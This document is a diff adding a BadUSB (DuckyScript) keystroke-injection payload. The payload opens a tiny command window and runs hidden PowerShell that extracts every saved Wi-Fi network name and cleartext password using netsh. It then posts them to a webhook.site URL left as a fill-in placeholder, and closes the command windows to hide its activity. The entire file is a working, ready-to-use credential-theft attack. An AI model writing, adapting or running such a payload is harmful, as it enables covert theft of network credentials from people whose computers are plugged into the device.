@@ -1,0 +1,9 @@
+DELAY 3000
+GUI r
+DELAY 100
+STRING cmd /k mode con: cols=15 lines=1
+ENTER
+DELAY 500
+STRING powershell -WindowStyle Minimized -Command "$wifiProfiles = netsh wlan show profile name=* key=clear | Select-String -Pattern ':(.+)$' | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }; $profiles = foreach ($profile in $wifiProfiles) { $profileInfo = netsh wlan show profile name=$profile key=clear | Select-String -Pattern 'SSID Name|Key Content'; if ($profileInfo.Count -eq 2) { $ssid = $profileInfo[0].ToString().Split(':')[1].Trim(); $password = $profileInfo[1].ToString().Split(':')[1].Trim(); [PSCustomObject]@{ SSID = $ssid; Password = $password } } }; $webhookUri = 'https://webhook.site/<YOUR_WEBHOOK_LINK_CODE_HERE>'; Invoke-RestMethod -Uri $webhookUri -Method POST -Body ($profiles | ConvertTo-Json) -ContentType 'application/json'; Start-Sleep -Seconds 2; Add-Type -TypeDefinition 'using System; using System.Diagnostics; public class CloseCmd { public static void Main() { Process[] processes = Process.GetProcessesByName(\"cmd\"); foreach (Process process in processes) { process.CloseMainWindow(); } } }' -Language CSharp; [CloseCmd]::Main();"
+ENTER
+DELAY 100
